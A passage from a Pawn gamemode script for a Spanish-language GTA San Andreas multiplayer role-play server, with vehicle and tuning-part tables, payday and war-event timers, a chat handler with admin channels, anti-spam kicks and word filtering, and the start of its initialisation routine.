	pColour,
	SpecID,
	SpecType,
	bool:AllowedIn,
	FailLogin,
	vowned,
	vowner,
	vowned2,
	vowner2,
	vowned3,
	vowner3,
	vowned4,
	vowner4,
	vowned5,
	vowner5,
	vowned6,
	vowner6,
	vowned7,
	vowner7,
	vowned8,
	vowner8,
	vowned9,
	vowner9,
	vowned10,
	vowner10,
}

new PlayerInfo[MAX_PLAYERS][pInfo];


/*enum vObjetos{
	tipo_vehiculo,
	Float:x_spawn_veh,
	Float:y_spawn_veh,
	Float:z_spawn_veh,
	Float:rotation_veh,
	color1_veh,
	color2_veh,
	respawn_delay_veh,
}

new VehicleObjetos[MAX_VEHICLES][vObjetos];*/

enum vInfo
{
	modding,
	model,
	Float:x_spawn,
	Float:y_spawn,
	Float:z_spawn,
	Float:za_spawn,
	Float:ox_spawn,
	Float:oy_spawn,
	Float:oz_spawn,
	Float:oza_spawn,
	color_1,
	color_2,
	owner[128],
	vehiclecost,
	bought,
	secure,
	asecure,
	vused,
	buybar,
	name[128],
	mod1,
	mod2,
	mod3,
	mod4,
	mod5,
	mod6,
	mod7,
	mod8,
	mod9,
	mod10,
	mod11,
	mod12,
	mod13,
	mod14,
	mod15,
	mod16,
	mod17,
	paintjob,
	Temp,
	ConObjetos,
};

new VehicleInfo[MAX_VEHICLES][vInfo];


enum ServerData
{
	MaxPing,
	ReadPMs,
	ReadCmds,
	MaxAdminLevel,
	AdminOnlySkins,
	AdminSkin,
	AdminSkin2,
	NameKick,
	PartNameKick,
	AntiBot,
	AntiSpam,
 	AntiSwear,
 	NoCaps,
	Locked,
	Password[128],
	GiveWeap,
	GiveMoney,
	ConnectMessages,
	AdminCmdMsg,
	AutoLogin,
	MaxMuteWarnings,
	DisableChat,
	MustLogin,
	MustRegister,
};
new ServerInfo[ServerData];
//============================Kill Timer Defines================================
new TeleTimer[MAX_PLAYERS];
new CountingTimer;
//================================Vehicle Defines===============================
new onsys[MAX_VEHICLES];
new Float:ta, Float:tb, Float:tc;
new PlayerInterior[MAX_PLAYERS];
new vehcount;

new VehicleName[212][0] = {
   "Landstalker",
   "Bravura",
   "Buffalo",
   "Linerunner",
   "Pereniel",
   "Sentinel",
   "Dumper",
   "Firetruck",
   "Trashmaster",
   "Stretch",
   "Manana",
   "Infernus",
   "Voodoo",
   "Pony",
   "Mule",
   "Cheetah",
   "Ambulance",
   "Leviathan",
   "Moonbeam",
   "Esperanto",
   "Taxi",
   "Washington",
   "Bobcat",
   "Mr Whoopee",
   "BF Injection",
   "Hunter",
   "Premier",
   "Enforcer",
   "Securicar",
   "Banshee",
   "Predator",
   "Bus",
   "Rhino",
   "Barracks",
   "Hotknife",
   "Trailer", //artict1
   "Previon",
   "Coach",
   "Cabbie",
   "Stallion",
   "Rumpo",
   "RC Bandit",
   "Romero",
   "Packer",
   "Monster Truck",
   "Admiral",
   "Squalo",
   "Seasparrow",
   "Pizzaboy",
   "Tram",
   "Trailer", //artict2
   "Turismo",
   "Speeder",
   "Reefer",
   "Tropic",
   "Flatbed",
   "Yankee",
   "Caddy",
   "Solair",
   "Berkley's RC Van",
   "Skimmer",
   "PCJ-600",
   "Faggio",
   "Freeway",
   "RC Baron",
   "RC Raider",
   "Glendale",
   "Oceanic",
   "Sanchez",
   "Sparrow",
   "Patriot",
   "Quad",
   "Coastguard",
   "Dinghy",
   "Hermes",
   "Sabre",
   "Rustler",
   "ZR-350",
   "Walton",
   "Regina",
   "Comet",
   "BMX",
   "Burrito",
   "Camper",
   "Marquis",
   "Baggage",
   "Dozer",
   "Maverick",
   "News Chopper",
   "Rancher",
   "FBI Rancher",
   "Virgo",
   "Greenwood",
   "Jetmax",
   "Hotring",
   "Sandking",
   "Blista Compact",
   "Police Maverick",
   "Boxville",
   "Benson",
   "Mesa",
   "RC Goblin",
   "Hotring Racer", //hotrina
   "Hotring Racer", //hotrinb
   "Bloodring Banger",
   "Rancher",
   "Super GT",
   "Elegant",
   "Journey",
   "Bike",
   "Mountain Bike",
   "Beagle",
   "Cropdust",
   "Stunt",
   "Tanker", //petro
   "RoadTrain",
   "Nebula",
   "Majestic",
   "Buccaneer",
   "Shamal",
   "Hydra",
   "FCR-900",
   "NRG-500",
   "HPV1000",
   "Cement Truck",
   "Tow Truck",
   "Fortune",
   "Cadrona",
   "FBI Truck",
   "Willard",
   "Forklift",
   "Tractor",
   "Combine",
   "Feltzer",
   "Remington",
   "Slamvan",
   "Blade",
   "Freight",
   "Streak",
   "Vortex",
   "Vincent",
   "Bullet",
   "Clover",
   "Sadler",
   "Firetruck", //firela
   "Hustler",
   "Intruder",
   "Primo",
   "Cargobob",
   "Tampa",
   "Sunrise",
   "Merit",
   "Utility",
   "Nevada",
   "Yosemite",
   "Windsor",
   "Monster Truck", //monstera
   "Monster Truck", //monsterb
   "Uranus",
   "Jester",
   "Sultan",
   "Stratum",
   "Elegy",
   "Raindance",
   "RC Tiger",
   "Flash",
   "Tahoma",
   "Savanna",
   "Bandito",
   "Freight", //freiflat
   "Trailer", //streakc
   "Kart",
   "Mower",
   "Duneride",
   "Sweeper",
   "Broadway",
   "Tornado",
   "AT-400",
   "DFT-30",
   "Huntley",
   "Stafford",
   "BF-400",
   "Newsvan",
   "Tug",
   "Trailer", //petrotr
   "Emperor",
   "Wayfarer",
   "Euros",
   "Hotdog",
   "Club",
   "Trailer", //freibox
   "Trailer", //artict3
   "Andromada",
   "Dodo",
   "RC Cam",
   "Launch",
   "Police Car (LSPD)",
   "Police Car (SFPD)",
   "Police Car (LVPD)",
   "Police Ranger",
   "Picador",
   "S.W.A.T. Van",
   "Alpha",
   "Phoenix",
   "Glendale",
   "Sadler",
   "Luggage Trailer", //bagboxa
   "Luggage Trailer", //bagboxb
   "Stair Trailer", //tugstair
   "Boxville",
   "Farm Plow", //farmtr1
   "Utility Trailer" //utiltr1
};

new	heavycar[24][0] = {
	{406},
	{444},
	{556},
	{557},
	{573},
	{601},
	{407},
	{427},
	{433},
	{434},
	{499},
	{498},
	{482},
	{431},
	{524},
	{578},
	{455},
	{403},
	{414},
	{443},
	{515},
	{428},
	{408},
	{456}
};
new	boat[11][0] = {
	{472},
	{473},
	{493},
	{595},
	{484},
	{430},
	{453},
	{452},
	{446},
	{454},
	{539}
};
new	mbike[11][0] = {
	{581},
	{521},
	{462},
	{463},
	{468},
	{471},
	{586},
	{522},
	{523},
	{461},
	{448}
};
new	pbike[3][0] = {
	{481},
	{509},
	{510}
};
new	splane[6][0] = {
	{593},
	{512},
	{513},
	{460},
	{464},
	{465}
};
new	mplane[2][0] = {
	{519},
	{511}
};
new	lplane[2][0] = {
	{553},
	{592}
};
new milair[4][0] = {
	{520},
	{476},
	{447},
	{425}
};
new sheli[4][0] = {
	{487},
	{488},
	{469},
	{497}
};
new lheli[3][0] = {
	{417},
	{548},
	{563}
};

new spoiler[20][0] = {
	{1000},
	{1001},
	{1002},
	{1003},
	{1014},
	{1015},
	{1016},
	{1023},
	{1058},
	{1060},
	{1049},
	{1050},
	{1138},
	{1139},
	{1146},
	{1147},
	{1158},
	{1162},
	{1163},
	{1164}
};

new nitro[3][0] = {
	{1008},
	{1009},
	{1010}
};

new fbumper[23][0] = {
	{1117},
	{1152},
	{1153},
	{1155},
	{1157},
	{1160},
	{1165},
	{1167},
	{1169},
	{1170},
	{1171},
	{1172},
	{1173},
	{1174},
	{1175},
	{1179},
	{1181},
	{1182},
	{1185},
	{1188},
	{1189},
	{1192},
	{1193}
};

new rbumper[22][0] = {
	{1140},
	{1141},
	{1148},
	{1149},
	{1150},
	{1151},
	{1154},
	{1156},
	{1159},
	{1161},
	{1166},
	{1168},
	{1176},
	{1177},
	{1178},
	{1180},
	{1183},
	{1184},
	{1186},
	{1187},
	{1190},
	{1191}
};

new exhaust[28][0] = {
	{1018},
	{1019},
	{1020},
	{1021},
	{1022},
	{1028},
	{1029},
	{1037},
	{1043},
	{1044},
	{1045},
	{1046},
	{1059},
	{1064},
	{1065},
	{1066},
	{1089},
	{1092},
	{1104},
	{1105},
	{1113},
	{1114},
	{1126},
	{1127},
	{1129},
	{1132},
	{1135},
	{1136}
};

new bventr[2][0] = {
	{1042},
	{1044}
};

new bventl[2][0] = {
	{1043},
	{1045}
};

new bscoop[4][0] = {
	{1004},
	{1005},
	{1011},
	{1012}
};

new rscoop[13][0] = {
	{1006},
	{1032},
	{1033},
	{1035},
	{1038},
	{1053},
	{1054},
	{1055},
	{1061},
	{1067},
	{1068},
	{1088},
	{1091}
};

new lskirt[21][0] = {
	{1007},
	{1026},
	{1031},
	{1036},
	{1039},
	{1042},
	{1047},
	{1048},
	{1056},
	{1057},
	{1069},
	{1070},
	{1090},
	{1093},
	{1106},
	{1108},
	{1118},
	{1119},
	{1133},
	{1122},
	{1134}
};

new rskirt[21][0] = {
	{1017},
	{1027},
	{1030},
	{1040},
	{1041},
	{1051},
	{1052},
	{1062},
	{1063},
	{1071},
	{1072},
	{1094},
	{1095},
	{1099},
	{1101},
	{1102},
	{1107},
	{1120},
	{1121},
	{1124},
	{1137}
};

new hydraulics[1][0] = {
	{1087}
};

new base[1][0] = {
	{1086}
};

new rbbars[2][0] = {
	{1109},
	{1110}
};

new fbbars[2][0] = {
	{1115},
	{1116}
};

new wheels[17][0] = {
	{1025},
	{1073},
	{1074},
	{1075},
	{1076},
	{1077},
	{1078},
	{1079},
	{1080},
	{1081},
	{1082},
	{1083},
	{1084},
	{1085},
	{1096},
	{1097},
	{1098}
};

new lights[2][0] = {
	{1013},
	{1024}
};
//==============================Important vehicle defines=======================
new vCount[MAX_PLAYERS];
new cCount[MAX_PLAYERS];
new passenger[MAX_PLAYERS];
new speedo[MAX_PLAYERS];
new intram[MAX_PLAYERS];
new tramid[MAX_PLAYERS];
new tempid[MAX_PLAYERS];
new lockmess[MAX_VEHICLES];
new securemess[MAX_VEHICLES];
new carmess[128];
new tuned;
new BUM[MAX_PLAYERS];
#define Driver 0
#define Passanger 2
//=============================Tele System Stuff================================
new cseconds,cstring[5];
new tseconds[MAX_PLAYERS], telestring[44], Float:Tx[MAX_PLAYERS],Float:Ty[MAX_PLAYERS],Float:Tz[MAX_PLAYERS],Ti[MAX_PLAYERS];
new tower;
new floor;
new tinteriorid;
new Float:Pickup[3][3] = {
{-297.0331,1494.9742,1071.1060},//banks
{-23.0664,-90.0882,1003.5469},
{-33.9593,-29.0792,1003.5573}
};
//=================================Team Colors==================================
#define COLOR_DARKGREEN 0x009600DD//NEW army Color
#define COLOR_GREEN 0x33AA33AA //SF Grove color
#define COLOR_RED 0xAA3333AA //SF Pimp color
#define COLOR_PINK 0xFF66FFAA //SF Triad color
#define COLOR_BLUE 0x0000BBAA //SF Mechanic color
#define COLOR_LIGHTBLUE 0x33CCFFAA //SF Pilot color
#define COLOR_ORANGE 0xFF9900AA //SF Swat color
#define COLOR_YELLOW 0xFFFF00AA
#define COLOR_PURPLE 0x330066AA
#define COLOR_GREY 0xCCCCCAA
#define COLOR_SKIN 0xFFA97FAA
#define COLOR_DARKGREY 0x333333AA
#define COLOR_DARKRED 0x990000AA
#define RED 0xFF0000AA
#define COLOR_INDIGO 0x4B00B0AA
#define COLOR_BRIGHTRED 0xDC143CAA
#define COLOR_AQUA 0x7CFC00AA
#define COLOR_DARKBLUE 0x0000BBAA
#define COLOR_BROWN 0x8B4513AA
#define COLOR_SYSTEM 0xEFEFF7AA
//==================================Defines=====================================
new Float:Pos[MAX_PLAYERS][4];
//new Language[MAX_PLAYERS] = 0; //Initialyse with the Default Language = English
new IsSpawned[MAX_PLAYERS];
new BankRobbedRecently;
new RecentCrime[MAX_PLAYERS];
new RecentVR[MAX_PLAYERS];
new fixedcarrecent[MAX_PLAYERS];
new SandInEngine[MAX_VEHICLES];
new RecentAskedMechanic[MAX_PLAYERS];
//new dm;
//================================Main Info=====================================
main()
{
	print(" ");
	print(">----------------------------------<");
	print("| SATDM ~ Role-Play V9 by MoNeYPiMp|");
	print(">----------------------------------<\n");
}
//==================================Exitded menu================================
public OnPlayerExitedMenu(playerid)
{
	if(!IsValidMenu(GetPlayerMenu(playerid))) return 1;
	ShowMenuForPlayer(GetPlayerMenu(playerid), playerid);
	return 1;
}
//===================================Pay day====================================
public PayDay()
{
    SendClientMessageToAll(red,"|PayDay| »{EAEAEA} Todos los negocios han generado ganancias!");
	for (new i = 0; i < MAX_PLAYERS; i++) {
		if(PlayerInfo[i][bowner] == 1) {
			new cbmon = BizInfo[PlayerInfo[i][bowned]][cashbox], pmon = BizInfo[PlayerInfo[i][bowned]][profit];
			BizInfo[PlayerInfo[i][bowned]][cashbox] = cbmon+pmon;
			SendClientMessage(i,red,"|PayDay| »{EAEAEA} Para cobrar las ganancias de tu negocio, regresa a tu negocio y escribe {DE570F}/CashBox.");
		}
	}
}
public GuerraTotalOn()
{
	KillTimer(EmpezarGT);
    SendClientMessageToAll(red,"|Guerra| »{EAEAEA} La guerra total ha sido activada por 15 minutos. Si quieres parar la musica usa /desactivar.");
	GameTextForAll("~w~Guerra Total ~n~~r~Activada",2500,3);
	GuerraTotal = 1;
	TextDrawShowForAll(Guerratotal);
	TextDrawShowForAll(Guerratotal1);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    PlayerPlaySound(i,1097,0.0,0.0,0.0);
		if(GuerraTotal == 1 && BloquearComandosInDerby[i]==0 && Joined[i] == false && BloquearComandosInDM[i] == 0){
			ArmasProhibidas[i]=0;
			new ArmasGT = random(3);
			if(ArmasGT == 0) GivePlayerWeapon(i,38,5000);
			else if(ArmasGT == 1) GivePlayerWeapon(i,36,1000);
			else if(ArmasGT == 2) GivePlayerWeapon(i,35,1000);
		}
	}
	TerminarGT = SetTimer("GuerraTotalOff",900000,1);
	return 1;
}

public GuerraTotalOff()
{
	KillTimer(TerminarGT);
	SendClientMessageToAll(red,"|Guerra| »{EAEAEA} La guerra total ha sido desactivada.");
	GameTextForAll("~w~Guerra Total ~n~~r~Desactivada",2500,3);
	GuerraTotal = 0;
	TextDrawHideForAll(Guerratotal);
	TextDrawHideForAll(Guerratotal1);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    PlayerPlaySound(i,1143,0.0,0.0,0.0);
		ArmasProhibidas[i]=1;
		if(BloquearComandosInDerby[i]==0 && Joined[i] == false && BloquearComandosInDM[i] == 0){
			ResetPlayerWeapons(i);
			DevolverArmasGuardadas(i);
		}
	}
	return 1;
}
//==============================================================================
stock ReturnTime()
{
	new jb_time[16],jb_h,jb_m,jb_s;
	gettime(jb_h,jb_m,jb_s);
	format(jb_time,sizeof(jb_time),"%02d:%02d:%02d",jb_h,jb_m,jb_s);
	return jb_time;
}

stock ReturnDate()
{
	new jb_date[32],jb_day,jb_month,jb_year;
	getdate(jb_year,jb_month,jb_day);
	format(jb_date,sizeof(jb_date),"%d. %s %d",jb_day,GetMonth(jb_month),jb_year);
	return jb_date;
}

stock GetMonth(month)
{
	new string[32];
	string="Unknown month";
	switch(month)
	{
	    case 1:
	        string="January";
		case 2:
		    string="February";
        case 3:
		    string="March";
        case 4:
		    string="April";
        case 5:
		    string="May";
		case 6:
		    string="June";
		case 7:
		    string="July";
		case 8:
		    string="August";
		case 9:
		    string="September";
		case 10:
		    string="October";
		case 11:
		    string="November";
		case 12:
		    string="December";
	}
	return string;
}

//==============================OnPlayerText====================================
public OnPlayerText(playerid, text[])
{
    //if(strfind(text,"[Aliance of Cheaters]Site Clan: AoC-GTA.RU[PizDoS Bot 0.3x || by AlexDrift]",true) == 0)
    //SendClientMessage(playerid, 0xFF0000AA, "Âû áûëè çàáàíåííû çà PizDos Bot");
    //Ban(playerid);
	new textocolor[200];
	if(afk[playerid] == 1)
	{
    	SendClientMessage(playerid, red, "|Error| »{EAEAEA} No puedes escribir mientras estás en modo AFK.");
		return 0;
	}
	if(IsSpawned[playerid] == 0)
	{
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes spawnear para poder escribir en el chat.");
		return 0;
	}
	if(text[0] == '$' && PlayerInfo[playerid][Level] >= 1) {
	    new string[128];
		format(string,sizeof(string),"||CHAT-ADMIN||{0080FF} %s [%i]: {FFFFFF}%s",PlayerName2(playerid),playerid,text[1]);
		MessageToAdmins(red,string);
		SaveToFile("AdminChatLog",string);
	    return 0;
	}
	if(text[0] == '*' && PlayerInfo[playerid][Level] >= 10) {
	    new string[128];
		format(string,sizeof(string),"||CHAT-OWNER||{0080FF} %s [%i]: {FFFFFF}%s",PlayerName2(playerid),playerid,text[1]);
		MessageToAdmins(red,string);
		SaveToFile("OwnerChatLog",string);
	    return 0;
	}
	if(text[0] == '&' && PlayerInfo[playerid][Vip] >= 1) {
	    new string[128];
		format(string,sizeof(string),"||CHAT-VIP||{00FF00} %s [%i]: {FFFFFF}%s",PlayerName2(playerid),playerid,text[1]);
		MessageToVips(red,string);
		SaveToFile("VipChatLog",string);
	    return 0;
	}
	for(new i = 1; i < MAX_CHAT_LINES-1; i++) Chat[i] = Chat[i+1];
	new ChatSTR[128]; GetPlayerName(playerid,ChatSTR,sizeof(ChatSTR)); format(ChatSTR,128,"[lchat]%s: %s",ChatSTR, text[0] );
	Chat[MAX_CHAT_LINES-1] = ChatSTR;
	if(PlayerInfo[playerid][Caps] == 1) UpperToLower(text);
	if(ServerInfo[NoCaps] == 1) UpperToLower(text);
	if(ServerInfo[DisableChat] == 1) {
	    SendClientMessage(playerid,red,"|Error| »{EAEAEA} El chat ha sido desactivado.");
		return 0;
	}
	if(PlayerInfo[playerid][Muted] == 1)
	{
		PlayerInfo[playerid][MuteWarnings]++;
		new string[128];
		if(PlayerInfo[playerid][MuteWarnings] < ServerInfo[MaxMuteWarnings]) {
            format(string, sizeof(string),"|Error| »{EAEAEA} Estas silenciado, si continuas escribiendo seras kickeado. {FF0000}[%d/%d]", PlayerInfo[playerid][MuteWarnings], ServerInfo[MaxMuteWarnings] );
			SendClientMessage(playerid,red,string);
		} else {
		    SendClientMessage(playerid,red,"|Info| »{EAEAEA} Has sido advertido! ahora has sido kickeado");
			format(string, sizeof(string),"{EAEAEA}%s(%d) ha sido expulsado. {FF0000}(Flood/Spam)", PlayerName2(playerid), playerid);
			SendClientMessageToAll(red,string);
			SaveToFile("KickLog",string);
			Kick(playerid);
		}
		return 0;
	}
	if(ServerInfo[AntiSpam] == 1 && (PlayerInfo[playerid][Level] == 0 && !IsPlayerAdmin(playerid)) )
	{
		if(PlayerInfo[playerid][SpamCount] == 0) PlayerInfo[playerid][SpamTime] = TimeStamp();

		PlayerInfo[playerid][SpamCount]++;
		if(TimeStamp() - PlayerInfo[playerid][SpamTime] > SPAM_TIMELIMIT) { // Its OK your messages were far enough apart
			PlayerInfo[playerid][SpamCount] = 0;
			PlayerInfo[playerid][SpamTime] = TimeStamp();
		}
		else if(PlayerInfo[playerid][SpamCount] == SPAM_MAX_MSGS) {
		    new string[128]; format(string,sizeof(string),"{EAEAEA}%s(%d) ha sido expulsado. {FF0000}(Flood/Spam)}", PlayerName2(playerid));
			SendClientMessageToAll(red,string); print(string);
			SaveToFile("KickLog",string);
			Kick(playerid);
		}
		else if(PlayerInfo[playerid][SpamCount] == SPAM_MAX_MSGS-1) {
		    SendClientMessage(playerid,red,"|Info| »{EAEAEA} Advertencia Anti Spam! La proxima es kick.");
			return 0;
		}
	}
	if(ServerInfo[AntiSwear] == 1 && PlayerInfo[playerid][Level] < ServerInfo[MaxAdminLevel])
	for(new s = 0; s < ForbiddenWordCount; s++)
	{
		new pos;
		while((pos = strfind(text,ForbiddenWords[s],true)) != -1) for(new i = pos, j = pos + strlen(ForbiddenWords[s]); i < j; i++) text[i] = '*';
	}
	if(TagOwner[playerid] == 1)
	{
		SetPlayerChatBubble(playerid, text[0], COLOR_WHITE, 100.0, 10000);
		format(textocolor,sizeof(textocolor),"||DUEÑO|| » {FFFF00}%s [%i]: {FFFFFF}%s",PlayerName2(playerid),playerid,text[0]);
		SendClientMessageToAll(red,textocolor);
	}
	if(TagEncargado[playerid] == 1)
	{
		SetPlayerChatBubble(playerid, text[0], COLOR_WHITE, 100.0, 10000);
		format(textocolor,sizeof(textocolor),"{0000FF}||ENCARGADO|| » {00BFFF}%s [%i]: {FFFFFF}%s",PlayerName2(playerid),playerid,text[0]);
		SendClientMessageToAll(red,textocolor);
	}
	if(TagAdmin2[playerid] == 1)
	{
		SetPlayerChatBubble(playerid, text[0], COLOR_WHITE, 100.0, 10000);
		format(textocolor,sizeof(textocolor),"||ADMINISTRADORA|| » {FF69B4}%s [%i]: {FFFFFF}%s",PlayerName2(playerid),playerid,text[0]);
		SendClientMessageToAll(red,textocolor);
	}
    if(TagAdmin[playerid] == 1)
	{
		SetPlayerChatBubble(playerid, text[0], COLOR_WHITE, 100.0, 10000);
		format(textocolor,sizeof(textocolor),"||ADMINISTRADOR|| » {0080FF}%s [%i]: {FFFFFF}%s",PlayerName2(playerid),playerid,text[0]);
		SendClientMessageToAll(red,textocolor);
	}
	if(TagVip[playerid] == 1)
	{
		SetPlayerChatBubble(playerid, text[0], COLOR_WHITE, 100.0, 10000);
		format(textocolor,sizeof(textocolor),"||VIP|| » {00FF00}%s [%i]: {FFFFFF}%s",PlayerName2(playerid),playerid,text[0]);
		SendClientMessageToAll(red,textocolor);
	}
	if(ColorNegro[playerid] == 1)
	{
		SetPlayerChatBubble(playerid, text[0], COLOR_WHITE, 100.0, 10000);
		format(textocolor,sizeof(textocolor),"[%d] » %s: {000000}%s",playerid,PlayerName2(playerid),text[0]);
		SendClientMessageToAll(GetPlayerColor(playerid),textocolor);
	}
	if(ColorRojo[playerid] == 1)
	{
		SetPlayerChatBubble(playerid, text[0], COLOR_WHITE, 100.0, 10000);
		format(textocolor,sizeof(textocolor),"[%d] » %s: {FF0000}%s",playerid,PlayerName2(playerid),text[0]);
		SendClientMessageToAll(GetPlayerColor(playerid),textocolor);
	}
	if(ColorAzul[playerid] == 1)
	{
		SetPlayerChatBubble(playerid, text[0], COLOR_WHITE, 100.0, 10000);
		format(textocolor,sizeof(textocolor),"[%d] » %s: {0000FF}%s",playerid,PlayerName2(playerid),text[0]);
		SendClientMessageToAll(GetPlayerColor(playerid),textocolor);
	}
	if(ColorVerde[playerid] == 1)
	{
		SetPlayerChatBubble(playerid, text[0], COLOR_WHITE, 100.0, 10000);
		format(textocolor,sizeof(textocolor),"[%d] » %s: {00FF00}%s",playerid,PlayerName2(playerid),text[0]);
		SendClientMessageToAll(GetPlayerColor(playerid),textocolor);
	}
	if(ColorAmarillo[playerid] == 1)
	{
		SetPlayerChatBubble(playerid, text[0], COLOR_WHITE, 100.0, 10000);
		format(textocolor,sizeof(textocolor),"[%d] » %s: {FFFF00}%s",playerid,PlayerName2(playerid),text[0]);
		SendClientMessageToAll(GetPlayerColor(playerid),textocolor);
	}
	if(ColorRosa[playerid] == 1)
	{
		SetPlayerChatBubble(playerid, text[0], COLOR_WHITE, 100.0, 10000);
		format(textocolor,sizeof(textocolor),"[%d] » %s: {FF69B4}%s",playerid,PlayerName2(playerid),text[0]);
		SendClientMessageToAll(GetPlayerColor(playerid),textocolor);
	}
	if(ColorCeleste[playerid] == 1)
	{
		SetPlayerChatBubble(playerid, text[0], COLOR_WHITE, 100.0, 10000);
		format(textocolor,sizeof(textocolor),"[%d] » %s: {00BFFF}%s",playerid,PlayerName2(playerid),text[0]);
		SendClientMessageToAll(GetPlayerColor(playerid),textocolor);
	}
	if(ColorNaranja[playerid] == 1)
	{
		SetPlayerChatBubble(playerid, text[0], COLOR_WHITE, 100.0, 10000);
		format(textocolor,sizeof(textocolor),"[%d] » %s: {FFA500}%s",playerid,PlayerName2(playerid),text[0]);
		SendClientMessageToAll(GetPlayerColor(playerid),textocolor);
	}
	if(ColorVioleta[playerid] == 1)
	{
		SetPlayerChatBubble(playerid, text[0], COLOR_WHITE, 100.0, 10000);
		format(textocolor,sizeof(textocolor),"[%d] » %s: {9932CC}%s",playerid,PlayerName2(playerid),text[0]);
		SendClientMessageToAll(GetPlayerColor(playerid),textocolor);
	}
	if(ColorDorado[playerid] == 1)
	{
		SetPlayerChatBubble(playerid, text[0], COLOR_WHITE, 100.0, 10000);
		format(textocolor,sizeof(textocolor),"[%d] » %s: {FFD700}%s",playerid,PlayerName2(playerid),text[0]);
		SendClientMessageToAll(GetPlayerColor(playerid),textocolor);
	}
	if(ColorMarron[playerid] == 1)
	{
		SetPlayerChatBubble(playerid, text[0], COLOR_WHITE, 100.0, 10000);
		format(textocolor,sizeof(textocolor),"[%d] » %s: {A52A2A}%s",playerid,PlayerName2(playerid),text[0]);
		SendClientMessageToAll(GetPlayerColor(playerid),textocolor);
	}
	if(ColorGris[playerid] == 1)
	{
		SetPlayerChatBubble(playerid, text[0], COLOR_WHITE, 100.0, 10000);
		format(textocolor,sizeof(textocolor),"[%d] » %s: {A9A9A9}%s",playerid,PlayerName2(playerid),text[0]);
		SendClientMessageToAll(GetPlayerColor(playerid),textocolor);
    }
	switch(xTestBusy)
	{
		case true:
		{
			if(!strcmp(xChars, text, false))
			{
				new string[128];
				format(string, sizeof(string), "|Test| »{0080FF} %s{EAEAEA} ha ganado el test de reacción. Empezara otro en %d minutos", PlayerName2(playerid), (TIME/60000));
				SendClientMessageToAll(red, string);
				PlayerInfo[playerid][Twin]++;
				GivePlayerMoney(playerid, xCash);
				SetPlayerScore(playerid, GetPlayerScore(playerid) + xScore);
				xReactionTimer = SetTimer("xReactionTest", TIME, 1);
				xTestBusy = false;
				SavePlayer(playerid);
			}
		}
	}
	if(PlayerInfo[playerid][DesactivarChat] == 1)
	{
		//SendClientMessage(playerid,red,"{FF0000}|Error| »{FFFFFF} El Chat ha sido desactivado.");
		return 0;
	}
	SetPlayerChatBubble(playerid, text[0], COLOR_WHITE, 100.0, 10000);
	format(textocolor,sizeof(textocolor),"[%d] » %s: {FFFFFF}%s",playerid,GetPName(playerid),text[0]);
	SendClientMessageToAll(GetPlayerColor(playerid),textocolor);
	return 0;
}
stock GetPName(playerid)
{
	new username[MAX_PLAYER_NAME];
	GetPlayerName(playerid,username,sizeof(username));
	return username;
}
forward ACarreras(playerid);
public ACarreras(playerid)
{
    LoadRaceNames();
	LoadAutoRace(RaceNames[random(TotalRaces)]);
	AutomaticRace = true;
	return 1;
}
//===============================Gamemode Start=================================
public OnGameModeInit()
{
    KZI_Loop();
    KZI_Init();
	MSecondsTimer = SetTimer("MSeconds", 100, 1);
	SendRconCommand("hostname "HOSTNAME);
	SendRconCommand("mapname "MAPNAME);
	SendRconCommand("language "LANGUAGE);
	//DisableInteriorEnterExits();
	Create3DTextLabel("{FF0000}/GUERRA",0x00B7FFFF,2447.5464,-2680.2290,21.4924,15.0,3);
	Create3DTextLabel("{FF0000}/GUERRA",0x00B7FFFF,2510.8770,-2652.2534,27.0000,15.0,3);
	Create3DTextLabel("{FF0000}/GUERRA",0x00B7FFFF,2458.0466,-2459.0356,26.6421,15.0,3);
	Create3DTextLabel("{FF0000}/GUERRA",0x00B7FFFF,2628.6064,-2419.9158,13.6328,15.0,3);
	Create3DTextLabel("{FF0000}/GUERRA",0x00B7FFFF,2739.7539,-2515.4673,17.3672,15.0,3);
	Create3DTextLabel("{FF0000}/GUERRA",0x00B7FFFF,2793.0684,-2416.3413,13.6324,15.0,3);
	Create3DTextLabel("{FF0000}/GUERRA",0x00B7FFFF,2701.9265,-2356.7053,27.2826,15.0,3);
	Create3DTextLabel("{FF0000}/GUERRA",0x00B7FFFF,2541.9375,-2340.5159,13.6250,15.0,3);
	Create3DTextLabel("{FF0000}/GUERRA",0x00B7FFFF,2615.6184,-2511.5593,33.1887,15.0,3);
	Create3DTextLabel("{FFFFFF}S U L T A N",0x00B7FFFF,-302.6832,1518.8037,75.3594,60.0,0);
	drift = CreatePickup(19131, 2, -302.6832,1518.8037,75.3594);
	//================================= Rejas ======================================================
	Reja1 = CreateObject(19912, 1282.77832, -2062.38110, 60.71246,   0.00000, 0.00000, 271.13068);
	Reja1_is_open = 0;
	//================================= PickUps ======================================================
	pickup_reja1 = CreatePickup(1239, 2, 1278.5521, -2048.5947, 59.1841);
	pickup2_reja1 = CreatePickup(1239, 2, 1285.8745, -2047.5813, 58.9205);
	///================================ Cargar menús que contienen imágenes ========================
	autoslist = LoadModelSelectionMenu("autos.txt");
    armaslist = LoadModelSelectionMenu("armas.txt");
    skinlist = LoadModelSelectionMenu("skins.txt");
	//----------------------------------Speedo--------------------------------------
	SetTimer("LuX_SpeedoMeterUp", UpdateSpeed, 1);
	for(new v=0; v<MAX_VEHICLES; v++){
	LuX_ReadPosition(v);}
	for(new i=0; i<PLAYERS; i++){
		//---------------------------------------------------------->
		#if TextBox
		LBox[i] = TextDrawCreate(612.000000,342.000000,"C");
		TextDrawUseBox(LBox[i],1);
		TextDrawBoxColor(LBox[i],0x00000033);
		TextDrawTextSize(LBox[i],454.000000,9.000000);
		TextDrawAlignment(LBox[i],0);
		TextDrawBackgroundColor(LBox[i],0x000000ff);
		TextDrawFont(LBox[i],3);
		TextDrawLetterSize(LBox[i],-0.000000,8.700001);
		TextDrawColor(LBox[i],BoxColor);
		TextDrawSetOutline(LBox[i],1);
		TextDrawSetProportional(LBox[i],1);
		TextDrawSetShadow(LBox[i],1);
		#endif
		//---------------------------------------------------------->
		#if TextTopLines
		LLine1[i] = TextDrawCreate(609.000000,341.000000,"L");
		TextDrawUseBox(LLine1[i],1);
		TextDrawBoxColor(LLine1[i],0xffffff33);
		TextDrawTextSize(LLine1[i],457.000000,-1.000000);
		TextDrawAlignment(LLine1[i],0);
		TextDrawBackgroundColor(LLine1[i],0x000000ff);
		TextDrawFont(LLine1[i],3);
		TextDrawLetterSize(LLine1[i],-0.000000,-0.400000);
		TextDrawColor(LLine1[i],TopLinesColor);
		TextDrawSetOutline(LLine1[i],1);
